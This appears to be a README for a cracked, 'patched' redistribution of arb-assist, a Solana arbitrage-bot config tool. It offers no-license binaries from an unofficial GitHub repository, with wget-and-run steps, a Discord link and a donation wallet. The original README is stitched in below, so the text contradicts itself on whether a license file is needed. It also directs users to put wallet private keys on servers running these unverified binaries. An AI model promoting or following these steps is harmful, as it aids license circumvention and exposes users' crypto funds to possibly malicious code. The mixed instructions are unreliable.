# DEV

This software is a patched version of [Arb-Assist](https://github.com/capicua4454/arb-assist). This release does not require a license and is up-to-date as of 25.07.2025.

- 🛠️ U just need to run `./run.sh` or `sh run.sh` and it will generate the config for you. 🛠️

If the script does not start, run the required binary file yourself, for example:

- `./binaries/patched-arb_x86_64-linux-musl`

# Our Discord

If you have any questions, please join our Discord: https://discord.gg/9HNfg2MS4y

# Buy me a coffee

Solana: FBhS1a57H6MnHAVcu3MntF1tj8MkGnrvo7nFWc49rgKE

# arb-assist (formerly known as smb-copy)

`arb-assist` is an automated config generator for [SolanaMevBot On-Chain](https://docs.solanamevbot.com/home/releases).

It can also generate the config, markets.json, and lookup-tables.json files for use with [NotArb onchain-bot](https://github.com/NotArb/Release/tree/main).

It analyzes recent on-chain activity to identify profitable mints for arbitrage and generates a config file accordingly.

For support, join us on [Discord](https://discord.gg/ADtnjdy5m5)

## 🕹️ Features:

- 📈 Auto Bot Control: Turn your bot on when markets pump, off when they cool down.,
- 💰 Maximize Profits: Keep more of your wins, waste less on gas.,
- 📝 Dynamic Config Generation: Create smb-onchain configs using arb-assist.,
- 🛠️ Market Intelligence: Copy mints and pools from any arb program or wallet.,
- 📊 Smart Filtering: Filter mints by successful arb transactions, ROI, and net swap volume.,
- ⚙️ Adaptive Fee Scaling: Set priority fees dynamically via Helius or copied wallets using percentiles.,
- 🍆 Dynamic Jito Tips: Set Jito tips dynamically using the Jito Bundle Floor Tracker,
- ⚡ Supports WSOL and USDC: Use spam or jito, exclude unwanted intermedium mints.,
- 🔍 ALUTs: Automatically retrieves most commonly used ALUTs from arb transactions.

If no mints meet your criteria, a dummy config is generated to stop `smb-onchain`.

---

## 🔧 Setup Instructions

### 1. Prerequisites

- Your license file must be in the same folder as `arb-assist`
- Your license is locked to the server IP and must be run from a whitelisted server
- For smb-onchain, `arb-assist` must be placed in same directory as the `smb-onchain` executable
- For NotArb onchain-bot, `arb-assist` must be placed in the `onchain-bot` subdirectory for NotArb
- You must have either Yellowstone GRPC or ThorStreamer to stream transaction data
- You should run it on a 8 core Ryzen VPS or better because arb-assist uses a very heavy GRPC stream

### 2. Install Node.js

Using NVM:

```bash
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash
. "$HOME/.nvm/nvm.sh"
nvm install 22
```

Verify installation:

```bash
node -v     # Should print "v22.15.0"
npm -v      # Should print "10.9.2"
nvm current # Should print "v22.15.0"
```

### 3. Install PM2

```bash
npm install -g pm2
```

### 4. Install TMUX

```bash
sudo apt-get install tmux
```

### 5A. Download Solana Mev Bot Onchain

```bash
sudo apt install wget
sudo apt install unzip
mkdir smb
cd smb
wget https://sourceforge.net/projects/solanamevbotonchain/files/smb-onchain-0.9.8.zip
unzip smb-onchain-0.9.8.zip
chmod +x *
./upgrade.sh
```

### 5B. Download NotArb Onchain-Bot

```bash
sudo apt update && sudo apt install git -y
mkdir notarb
cd notarb
git clone https://github.com/NotArb/Release.git
cd Release
cd onchain-bot
```

### 6. Download arb-assist

```bash
wget -O patched-arb_aarch64-linux-musl https://github.com/wakeupwakeupwakeup/arb-assist-patched/raw/refs/heads/main/binaries/patched-arb_aarch64-linux-musl
chmod +x patched-arb_aarch64-linux-musl
```

OR

```bash
wget -O patched-arb_x86_64-linux-glibc https://github.com/wakeupwakeupwakeup/arb-assist-patched/raw/refs/heads/main/binaries/patched-arb_x86_64-linux-glibc
chmod +x patched-arb_x86_64-linux-glibc
```

OR

```bash
wget -O patched-arb_x86_64-linux-musl https://github.com/wakeupwakeupwakeup/arb-assist-patched/raw/refs/heads/main/binaries/patched-arb_x86_64-linux-musl
chmod +x patched-arb_x86_64-linux-musl
```

```bash
wget https://github.com/wakeupwakeupwakeup/arb-assist-patched/raw/refs/heads/main/config.toml.example
```

After you are done, your directory should look like this:

SMB (You will transfer your arb-assist license key into this folder):

![image](https://github.com/user-attachments/assets/a1be20de-2160-4739-9600-0486371f000b)

NotArb:

Release directory:

![image](https://github.com/user-attachments/assets/86464c98-86ae-45a5-b6fc-3c1ab5e2630d)

Onchain-bot directory (You will transfer your arb-assist license key into this folder):

![image](https://github.com/user-attachments/assets/50cc1587-06a0-4ce1-acbb-136f2c89566d)

---

## 📦 7. Running Arb-Assist

Make sure to give all files the proper permissions to run:

```bash
chmod +x *
```

- You should encrypt your private key using smb-onchain or NotArb locally, then transfer only the encrypted private key to your server.
- Also, you need to transfer your license file for arb-assist that is tied to your server IP address.
- You should rename config.toml.example to config.toml - this is the config file used by arb-assist
- Then, you should open config.toml using nano or another text editor to configure your settings for arb-assist.
- You can use one of the examples on the arb-assist github as a starting template.

- \*.license is your license file. It should have your IP address instead of 0.0.0.0
- config.toml is the config file used by arb-assist, the config file used by smb-onchain will be generated after running arb-assist
- arb-assist is this script
- smb-onchain is the SolanaMevBot On-Chain bot
- If you are using NotArb, make sure arb-assist is saved into the Release/onchain-bot/ directory

First, increase the ulimit

```bash
ulimit -n 65536
```

Then, test arb-assist to make sure everything is working:

```bash
./arb-assist
```

On start-up, you will see a few log messages that confirm your license is valid and that you are successfully connected to your GRPC datastream:

![image](https://github.com/user-attachments/assets/d98c011c-8bed-4966-85b1-1cb8b7b97e0f)

After a short time, you will see a lot of data printed on the screen:

This shows the ranking of top mints and important statistics:

![image](https://github.com/user-attachments/assets/7d010481-08fc-4799-99a9-20b0437b3169)

After you have confirmed that arb-assist is working, you can run it in the background with either pm2 or tmux.

To run it with tmux, open up a tmux instance:

```bash
tmux
```

Inside the tmux instance, run arb-assist:

```bash
ulimit -n 65536
./arb-assist
```

To exit from the tmux instance and leave it running in the background, type:

```bash
CTRL-b
d
```

To see what tmux instances you have in the background type:

```bash
tmux ls
```

![image](https://github.com/user-attachments/assets/275f9bde-1a9f-4db1-8af5-9b16a4301dcc)

To re-attach the instance type:

```bash
tmux attach -t 0
```

Keep `arb-assist` running using `pm2`, `tmux`, or similar tools.

For more info on [tmux](https://hamvocke.com/blog/a-quick-and-easy-guide-to-tmux/)

For more info on [pm2](https://pm2.keymetrics.io/docs/usage/quick-start/)

## 📦 8A. Running SMB-Onchain

Follow the instructions for SolanaMevBot On-Chain here: https://docs.solanamevbot.com/home/onchain-bot/getting-started

### Encrypt your private key

Before running smb-onchain, you must encrypt your private key. You will first create a generic smb-config.toml file:

```bash
[bot]
merge_mints = false
compute_unit_limit = 600_000

[[routing.mint_config_list]]
mint = "GUM5Vd4qe5kgTBHNfmLRaZSKKmYdAWxLJ18DY1Uzpump"
pump_pool_list = ["FYDmYvJ3gynXGGFnAbTwN8CRR3LrrNdhztbkuybvYtj2"]
meteora_dlmm_pool_list = ["ToLi6ihgfv4HLPE8GujTxKAexRxopDyk31NVpNgyxuY",]
lookup_table_accounts = []
process_delay = 400

[rpc]
url = "xxx"

[spam]
sending_rpc_urls = [
  "xxx",
]
enabled = true
compute_unit_price = { strategy = "Random", from = 10000, to = 50000, count = 1 }
max_retries = 10

[flashloan]
enabled = true

[wallet]
private_key = "xxx"
```

Put your private key into this file in the [wallet] section and run smb-onchain. You can do this either on your Linux VPS or locally on WSL.

```bash
./smb-onchain run smb-config.toml
```

Once you run this command, the bot will encrypt your private key. You should then delete the private key from smb-config.toml or delete smb-config.toml.

```bash
rm smb-config.toml
```

This encrypted private key file must be placed in the same folder as your bot.

Now, on your Linux VPS you can run smb-onchain for real.

Start `smb-onchain` with:

```bash
pm2 start smb-onchain --watch smb-config.toml -- run smb-config.toml
```

![image](https://github.com/user-attachments/assets/c20c0f02-9bdb-479c-818f-416fbdde311a)

Make sure to modify this command if you rename smb-config.toml to something else. You cannot name it "config.toml" because that is the config file used by arb-assist.
This watches `smb-config.toml` for changes. When `arb-assist` updates the config, `smb-onchain` restarts automatically.

To monitor program started with pm2, type:

```bash
pm2 monit
```

![image](https://github.com/user-attachments/assets/01cd6bf7-f22a-4504-bb17-f9c7cf903655)

---

## 📦 8B. Running NotArb Onchain-Bot

First, encrypt your private key using NotArb.

From the main NotArb folder open notarb-global.toml

```bash
nano notarb-global.toml
```

Put the path to your private key file in the appropriate area, then save and exit.

Then, from the main NotArb folder, you will run:

```bash
bash notarb.sh protect-keypair
```

This will generate a protected keypair file. You can now delete the original private key file.

Return to notarb-global.toml

```bash
nano notarb-global.toml
```

You should now update the keypair path to the new protected keypair path.

In the arb-assist config.toml, you will need to set the path to your protected keypair here:

```bash
keypair_path="${DEFAULT_KEYPAIR_PATH}"
```

To use with NotArb onchain-bot, you should copy arb-assist, config.toml, and your license file to the onchain-bot/ folder

In the arb-assist config.toml make sure you set:

mode = "na"

You will also need to run NotArb onchain using pm2:

```bash
pm2 start ./notarb.sh --interpreter bash --name notarb-onchain --watch onchain-bot/notarb-config.toml -- onchain-bot/notarb-config.toml
```

This will generate a markets.json file formatted as a 2D array of market addresses

![image](https://github.com/user-attachments/assets/1360f0f8-ecfb-4768-8ec1-9ce80c5879c8)

It will also generate a lookup-tables.json file formatted as a 1D array of lookup table addresses

![image](https://github.com/user-attachments/assets/09196321-d9f0-45bb-b9e5-8c00eb5d6f86)

Now, arb-assist will update your notarb-config.toml with dynamic priority fees and jito tips.

## 9. Updating Arb-Assist

To update Arb-Assist easily, you can use wget to overwrite the existing file.
First, make sure you exist arb-assist so that the old file can be overwritten:

```bash
ctrl+c
```

Next, use the wget command with the overwrite flag:

```bash
wget -O patched-arb_aarch64-linux-musl https://github.com/wakeupwakeupwakeup/arb-assist-patched/raw/refs/heads/main/binaries/patched-arb_aarch64-linux-musl
chmod +x patched-arb_aarch64-linux-musl
```

OR

```bash
wget -O patched-arb_x86_64-linux-glibc https://github.com/wakeupwakeupwakeup/arb-assist-patched/raw/refs/heads/main/binaries/patched-arb_x86_64-linux-glibc
chmod +x patched-arb_x86_64-linux-glibc
```

OR

```bash
wget -O patched-arb_x86_64-linux-musl https://github.com/wakeupwakeupwakeup/arb-assist-patched/raw/refs/heads/main/binaries/patched-arb_x86_64-linux-musl
chmod +x patched-arb_x86_64-linux-musl
```

The old version of arb-assist will be replaced.

---

## 10. Arb-Assist file server

To use the arb-assist file server, you should set the port number in your config.toml. It does not have to be 8080, you can set it to any available port.

```bash
port = 8080
```

The configuration files will be served at this port number:

![image](https://github.com/user-attachments/assets/a0bd84a4-485f-4f05-ad3d-6c9e738aae8d)

This will allow you to run arb-assist on one server and run your bot on any number of servers using the same configuration.

It is highly recommended that you use 'ufw' to protect this port and only allow whitelisted servers to access it.

## 🛠 Troubleshooting

**Error:**

```
called `Result::unwrap()` on an `Err` value: Os { code: 24, kind: Uncategorized, message: "Too many open files" }
```

**Fix:**

```bash
ulimit -n 65536
```

---

## Half-life

📉 How Half-Life Degradation Works

When transactions happen, your activity score increases. If that score crosses a threshold, your bot activates (e.g. to start arbitraging).

However, older transactions shouldn't count forever. To address this, we apply half-life decay, which gives more weight to recent activity and gradually reduces the influence of past transactions.
🔧 What Is Half-Life?

Half-life is the time it takes for the impact of a transaction to reduce by half. You can adjust this to control how quickly your score decays:

    Short half-life (e.g. 1 min)
    → Score drops quickly. Bot deactivates soon after activity ends.

    Long half-life (e.g. 8 min)
    → Score decays slowly. Bot stays active longer even with gaps in activity.

📊 Visual Explanation

The chart below shows the same random bursts of transaction activity applied across four different half-life settings:

    Dashed line = transaction bursts

    Solid lines = degraded scores with half-lives of 1, 2, 4, and 8 minutes

Each line decays at a different rate depending on the configured half-life.

You can tune the half-life depending on your strategy:

    Use a short half-life for fast-reacting, short-lived arbs.

    Use a long half-life if you want to track sustained interest in a token.

![e5744aa0-c96c-472d-b127-ac8c878ffc84](https://github.com/user-attachments/assets/52d9d589-183b-4b94-b9a6-933c2b71876f)

## 📊 Example Output

`mints` ranked by arbitrage profitability:

![image](https://github.com/user-attachments/assets/61f64861-4900-415b-afc6-1a37af5bee71)

Jito Tips retrieved from Jito Bundle tip floor API

![image](https://github.com/user-attachments/assets/5464304f-ee55-44ef-8fb6-ca94733030b6)

Estimated priority fees using Helius:

![Priority Fees](https://github.com/user-attachments/assets/ff57af74-9a79-4bdb-8b5d-51df8f28945c)

## 🧠 Optimizing your Filters

To start, I recommend you filter arb programs to only copy Solana MEV bot on-chain transactions. Run arb-assist and take note of the statistics for the top 10 mints. Pay attention to the Txns, net vol/min, and ROI. You should check these numbers during times when the market is hot and when the market is cold. For your filter settings, choose numbers that will shut down the bot when the market is cold and turn on the bot when the market is hot.
